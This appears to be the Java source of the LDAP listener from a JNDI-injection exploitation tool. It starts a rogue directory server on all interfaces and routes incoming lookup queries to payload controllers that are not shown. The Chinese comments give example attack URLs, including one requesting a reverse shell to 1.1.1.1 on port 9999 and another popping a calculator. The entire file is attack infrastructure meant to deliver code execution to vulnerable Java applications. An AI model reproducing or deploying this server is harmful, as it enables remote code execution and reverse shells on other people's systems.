package com.idiot9.ldap;

import com.idiot9.ldap.controllers.LdapController;
import com.idiot9.ldap.controllers.LdapMapping;
import com.idiot9.ldap.utils.Config;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import org.reflections.Reflections;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.lang.reflect.Constructor;
import java.net.InetAddress;
import java.util.Set;
import java.util.TreeMap;


public class LdapServer extends InMemoryOperationInterceptor {

    TreeMap<String, LdapController> routes = new TreeMap<String, LdapController>();

    public static void start() {
        try {
            InMemoryDirectoryServerConfig serverConfig = new InMemoryDirectoryServerConfig("dc=example,dc=com");
            serverConfig.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    Config.ldapport,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            serverConfig.addInMemoryOperationInterceptor(new LdapServer());
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(serverConfig);
            ds.startListening();
            System.out.println("[+] LDAP Server Start Listening on " + Config.ldapport + "...");
        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    public LdapServer() throws Exception {

        //find all classes annotated with @LdapMapping
        Set<Class<?>> controllers = new Reflections(this.getClass().getPackage().getName())
                .getTypesAnnotatedWith(LdapMapping.class);

        //instantiate them and store in the routes map
        for(Class<?> controller : controllers) {
            Constructor<?> cons = controller.getConstructor();
            LdapController instance = (LdapController) cons.newInstance();
            String[] mappings = controller.getAnnotation(LdapMapping.class).uri();
            for(String mapping : mappings) {
                if(mapping.startsWith("/"))
                    mapping = mapping.substring(1); //remove first forward slash

                routes.put(mapping, instance);
            }
        }
    }

    /**
     * {@inheritDoc}
     *
     * @see InMemoryOperationInterceptor#processSearchResult(InMemoryInterceptedSearchResult)
     */
    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {
        //base 即请求的URL，比如ldap://127.0.0.1/Basic/calc，这里的base就是Basic/calc
        String base = result.getRequest().getBaseDN();
        System.out.println("[+] Received LDAP Query: " + base);
        LdapController controller = null;
        //find controller
        for(String key: routes.keySet()) {
            //compare using wildcard at the end
            if(base.toLowerCase().startsWith(key)) {
                controller = routes.get(key);
                break;
            }
        }

        if(controller == null){
            System.out.println("[!] Invalid LDAP Query: " + base);
            return;
        }

        try {
            //对传进来的base进行分割，取出里面的值，比如:ldap://127.0.0.1/Basic/ReverseShell/1.1.1.1/9999，就要取出ip和port
            controller.process(base);
            controller.sendResult(result, base);
        } catch (Exception e1) {
            System.out.println("[!] Exception: " + e1.getMessage());
        }
    }
}